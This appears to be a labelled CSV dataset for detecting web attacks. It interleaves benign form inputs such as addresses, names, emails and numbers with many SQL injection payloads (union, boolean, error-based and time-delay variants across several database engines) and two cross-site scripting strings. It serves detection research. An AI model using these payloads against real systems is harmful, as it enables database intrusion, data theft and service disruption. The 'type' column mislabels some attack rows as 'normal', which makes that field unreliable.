Text,attack_type,Label,type
av. la salinera s/n,norm,0,normal
conesa,norm,0,normal
18452,norm,0,normal
"1')) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"-4280%""))) union all select 7981,7981--",sqli,1,sql
stephany,norm,0,normal
1110922192224003,norm,0,normal
1'+(select qugu where 2287=2287 order by 1#,sqli,1,sql
padoan@directoriogratuito.et,norm,0,normal
"-1064' or make_set(6439=2937,2937) and 'qojd'='qojd",sqli,1,normal
10970,norm,0,normal
"c/ conquista 94, 1?c",norm,0,normal
cherino gebhardt,norm,0,normal
tehchi8,norm,0,normal
cami del fredolic 115,norm,0,normal
paracuellos,norm,0,normal
3549373062406547,norm,0,normal
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'tfso'='tfso",sqli,1,sql
tanglao,norm,0,normal
1%'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
"-8640) or elt(7657=5020,5020) and (2346=2346",sqli,1,normal
bora,norm,0,normal
yuraj,norm,0,normal
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
romanov xandri,norm,0,normal
"-4047'||(select 'rqta' from dual where 9743=9743 union all select 9743,9743,9743#",sqli,1,sql
kwasniewska.tamburi@testdevelcidad.cr,norm,0,normal
1')));select (case when (4111=1992) then 4111 else 1/(select 0) end)--,sqli,1,sql
08573,norm,0,normal
bularros,norm,0,normal
"1)) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
1) where 2930=2930;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"1'))) and make_set(7539=3946,3946) and ((('qbpo'='qbpo",sqli,1,normal
minardi cardea,norm,0,normal
helmos@pool-control.mx,norm,0,normal
ci7806c8t7,norm,0,normal
22063837y,norm,0,normal
almirante,norm,0,normal
9810,norm,0,normal
-3752%' union all select 9351--,sqli,1,sql
0003204654562755,norm,0,normal
"1') where 7561=7561 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
paterna del campo,norm,0,normal
16574331w,norm,0,normal
"1%"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
01719,norm,0,normal
boring_besch@copiar.com.pg,norm,0,normal
anz1@hiperbilbao.fj,norm,0,normal
gold.medwin@maridosadomicilio.no,norm,0,normal
3317442744266794,norm,0,normal
zanet,norm,0,normal
integrat,norm,0,normal
"-6158"") union all select 3084,3084,3084,3084,3084,3084#",sqli,1,sql
orieta,norm,0,normal
"1%"");select (case when (1898=4705) then 1898 else 1/(select 0) end)--",sqli,1,sql
"1')) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",sqli,1,sql
"1"") union all select null,null--",sqli,1,sql
"1') as noqp where 4042=4042 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
soriguera,norm,0,normal
576,norm,0,normal
1') rlike sleep(5)#,sqli,1,normal
75000191c,norm,0,normal
cinaci0a,norm,0,normal
"masroig, el",norm,0,normal
38182378d,norm,0,normal
"1'||(select 'xhcr' from dual where 9279=9279;iif(2452=8999,1,1/0)",sqli,1,sql
"c/ de puigcerda s/n, 1-g",norm,0,normal
1')) as bswc where 1635=1635 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
"-5903%""))) or 3038=3038",sqli,1,normal
-2783%')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',sqli,1,sql
1') where 8575=8575 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
"1'||(select 'gmkp' where 6016=6016;select count(*) from generate_series(1,5000000))||'",sqli,1,sql
13679,norm,0,normal
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('uwbh'='uwbh",sqli,1,sql
"calle austria, 183 1-c",norm,0,normal
"1"")) and 8594=(select 8594 from pg_sleep(5))--",sqli,1,sql
1') where 6440=6440 or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
t324a3ra5a,norm,0,normal
"-4705' where 2029=2029 union all select 2029,2029,2029#",sqli,1,sql
sigfrido,norm,0,normal
-1087) where 5787=5787 union all select 5787#,sqli,1,sql
rider,norm,0,normal
oliveira,norm,0,normal
munn,norm,0,normal
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
onofredo,norm,0,normal
"calle batalla de otumba 26,",norm,0,normal
8461933657900272,norm,0,normal
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",sqli,1,sql
arona,norm,0,normal
6068872353637428,norm,0,normal
"1"") where 4112=4112;select sleep(5)#",sqli,1,sql
"guadalajara, 101 4-e",norm,0,normal
theo,norm,0,normal
o+bispar,norm,0,normal
02153,norm,0,normal
x onfocus=alert(1)>,xss,2,normal
"1%"") or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
">""<div style=""width: expression(document.cookie=true;);"">",xss,2,sql
9448,norm,0,normal
02858717r,norm,0,normal
raysa,norm,0,normal
0476227677122044,norm,0,normal
cencier,norm,0,normal
"1"") as kbjt where 2012=2012 and (5978=6898)*6898--",sqli,1,sql
62349457e,norm,0,normal
ikebe.king@zarasalud.us,norm,0,normal
"-6406%') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='",sqli,1,sql
tr11quil67321e,norm,0,normal
bianchi@atrioregalos.im,norm,0,normal
claret pedrola,norm,0,normal
ronnback.pitre@pro-isfv.nc,norm,0,normal
torremocha de jiloca,norm,0,normal
"1"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
19219,norm,0,normal
herrmann@codwatw.edu,norm,0,normal
navacepedilla de corneja,norm,0,normal
3064942409734995,norm,0,normal
